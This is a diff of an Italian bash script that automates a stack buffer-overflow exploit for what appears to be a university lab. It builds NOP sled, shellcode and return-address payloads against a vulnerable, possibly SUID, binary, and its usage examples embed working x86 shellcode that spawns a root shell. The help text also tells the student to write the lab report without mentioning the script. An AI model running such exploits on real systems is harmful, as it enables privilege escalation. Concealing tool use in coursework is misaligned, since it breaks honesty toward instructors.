@@ -21,18 +21,18 @@ NAME
     exec_shellcode.sh - Ricerca dell'indirizzo di ritorno (shellcode + NOP sled)
 
 SYNOPSIS
-    ./exec_shellcode.sh [OPZIONI] [./binario] [OFFSET] [NOP] [SHELLCODE]
+    ./exec_shellcode.sh [OPZIONI] [./binario] [OFFSET] [SHELLCODE]
     ./exec_shellcode.sh [OPZIONI]        # chiede i parametri mancanti a video
 
 ARGOMENTI POSIZIONALI (opzionali: se ne ometti uno, te lo chiede a video)
     ./binario    Il binario vulnerabile (SUID o no).
     OFFSET       Byte di padding prima dell'indirizzo di ritorno (es. 112).
                  E' l'offset EIP, quello stampato da offset_finder.sh.
-    NOP          Numero di byte NOP (\x90) all'inizio del payload (es. 66).
-                 Regola: NOP + lunghezza_shellcode == OFFSET.
     SHELLCODE    Lo shellcode. Due formati accettati, riconosciuti da solo:
                  - formato \x (come il prof):  \x31\xc0\xb0\x46...\x2f\x73\x68
                  - esadecimale continuo:       31c0b046...2f7368
+
+    Il numero di NOP viene calcolato da solo: NOP = OFFSET - lunghezza_shellcode.
 
     Struttura del payload prodotto:
         [NOP * \x90] + [shellcode] + [indirizzo di ritorno (4 byte, LE)]
@@ -70,10 +70,10 @@ ESEMPI
 
     # Shellcode nel formato del prof, tutti i parametri sulla riga:
     SC='\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
-    ./exec_shellcode.sh ./es 112 66 "$SC"
+    ./exec_shellcode.sh ./es 112 "$SC"
 
     # Binario non-SUID (shell del proprio utente): aggiungi -m "uid="
-    ./exec_shellcode.sh ./bof 622 576 "$SC" -m "uid="
+    ./exec_shellcode.sh ./bof 622 "$SC" -m "uid="
 
 REPORT (da inserire a mano, SENZA citare lo script)
     - "Ho lanciato il binario sotto GDB con una sled di soli NOP e, ispezionando
@@ -131,19 +131,16 @@ normalize_sc() {
 }
 
 # --------------------------- Raccolta parametri ----------------------------
+# NOP non e' piu' un parametro: lo calcolo da OFFSET - lunghezza_shellcode.
 BINARY="$1"
 OFFSET="$2"
-NOP="$3"
-SC_RAW="$4"
+SC_RAW="$3"
 
 if [ -z "$BINARY" ]; then
 	read -r -e -p "Percorso del binario vulnerabile (es. ./es) > " BINARY
 fi
 if [ -z "$OFFSET" ]; then
 	read -r -p "Offset EIP in byte (da offset_finder.sh, es. 112) > " OFFSET
-fi
-if [ -z "$NOP" ]; then
-	read -r -p "Numero di byte NOP all'inizio del payload (es. 66) > " NOP
 fi
 
 if [ -n "$SC_FILE" ]; then
@@ -163,8 +160,8 @@ fi
 if [ ! -x "$BINARY" ]; then
 	echo "[-] '$BINARY' non esiste o non e' eseguibile."; exit 1
 fi
-if ! [[ "$OFFSET" =~ ^[0-9]+$ ]] || ! [[ "$NOP" =~ ^[0-9]+$ ]]; then
-	echo "[-] OFFSET e NOP devono essere numeri interi."; exit 1
+if ! [[ "$OFFSET" =~ ^[0-9]+$ ]]; then
+	echo "[-] OFFSET deve essere un numero intero."; exit 1
 fi
 if ! command -v gdb >/dev/null 2>&1; then
 	echo "[-] gdb non trovato nel PATH."; exit 1
@@ -176,14 +173,14 @@ if ! [[ "$SC_HEX" =~ ^[0-9a-fA-F]+$ ]] || [ $(( ${#SC_HEX} % 2 )) -ne 0 ]; then
 fi
 SC_LEN=$(( ${#SC_HEX} / 2 ))
 
-EXPECTED=$(( NOP + SC_LEN ))
-if [ "$EXPECTED" -ne "$OFFSET" ]; then
-	echo "[!] ATTENZIONE: NOP($NOP) + shellcode($SC_LEN) = $EXPECTED, ma l'offset e' $OFFSET."
-	echo "    Il return address finirebbe disallineato rispetto all'EIP."
-	echo "    Regola: NOP + len(shellcode) deve essere == OFFSET (differenza: $(( OFFSET - EXPECTED )) byte)."
-	read -r -p "    Continuo comunque? (y/N) > " GO
-	[ "$GO" == "y" ] || exit 1
+# NOP calcolato da solo: riempie tutto lo spazio prima del return address.
+NOP=$(( OFFSET - SC_LEN ))
+if [ "$NOP" -lt 0 ]; then
+	echo "[-] Lo shellcode ($SC_LEN byte) e' piu' lungo dell'offset ($OFFSET)."
+	echo "    Impossibile: non c'e' spazio per i NOP. Controlla offset/shellcode."
+	exit 1
 fi
+echo "[*] NOP calcolati: $NOP  (offset $OFFSET - shellcode $SC_LEN byte)"
 
 # --------------------------- ASLR ------------------------------------------
 if [ "$ASLR_OFF" = true ]; then
